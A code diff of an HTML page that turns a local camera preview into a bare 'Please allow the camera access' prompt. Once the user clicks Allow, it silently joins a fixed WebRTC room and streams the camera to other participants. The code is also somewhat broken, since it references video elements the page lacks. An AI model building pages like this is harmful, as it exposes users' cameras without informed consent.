@@ -1,26 +1,31 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Preview Video</title>
+    <title>Request Access</title>
+    <script src="https://cdn.simplewebrtc.com/latest-v3.js"></script>
   </head>
   <body>
-    <video id="video" width="640" height="480" autoplay controls></video>
-
+    <h1>Please allow the camera access</h1>
+    <button onclick="requestAccess()">Allow</button>
     <script>
-      // Mengambil elemen video
-      const video = document.getElementById('video');
-
-      // Mendapatkan izin untuk mengakses kamera
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          // Menetapkan stream dari kamera ke elemen video
-          video.srcObject = stream;
-          // Memulai video
-          video.play();
-        })
-        .catch(error => {
-          console.error(error);
-        });
+      var webrtc;
+      function requestAccess() {
+        // Request access to the user's camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            webrtc = new SimpleWebRTC({
+                localVideoEl: 'localVideo',
+                remoteVideosEl: 'remoteVideo',
+                autoRequestMedia: true
+            });
+            webrtc.on('readyToCall', function () {
+                webrtc.joinRoom('preview_video_room');
+            });
+          })
+          .catch(error => {
+            console.error(error);
+          });
+      }
     </script>
   </body>
 </html>
